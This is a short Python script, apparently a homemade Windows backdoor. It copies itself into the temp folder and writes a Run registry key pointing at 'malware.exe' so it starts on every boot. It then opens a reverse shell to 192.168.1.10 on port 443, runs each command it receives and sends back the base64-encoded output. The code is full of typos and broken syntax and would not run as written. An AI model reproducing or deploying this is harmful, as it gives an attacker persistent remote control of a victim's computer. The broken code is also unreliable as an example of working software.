import sys, base64, os, socket, subprocess
from_winreg 

def autorun(tempdir, fileName, run):
    os.system('copy %s %s '%(fileName, tempdir))

    key=opneKey(HKEY_LOCAL_MACHINE,run)
    runkey=[]
    try:
        i=0
        while tru:
            sunkey=EnumValue(key, i)
            runkey.append(subkey[0])
            i+=i
        except WindowsError:
            pass
        if 'Python2X' not in runkey:
            try:
                key=OpneKey(HKEY_LOCAL_MACHINE,run, 0, KEY_ALL_ACCESS)
                SetValueEx(key, 'Python2X',0,REG_SZ, r"%TEMP%\malware.exe")
            except WindowsError:
                pass
def shell():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('192.168.1.10', int(443)))
    s.sed('[*]connection Established!')
    while 1:
        data = s.recv(1024)
        if data=="quit": break
        proc=subproces.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value=proc.stdout.read()+proc.stderr.read()
        encode=base64.b64encode(stdout_value)
        s.send(encode)
    s.close()
def main():
    tempdir='%TEMP%'
    fileName=sys.argv[0]
    run="Software\Microsoft\Windows\CurrentVersion\Run"
    autorun(tempdir,fileName, run)
    shell()
if __name__=="__main__":
    main()
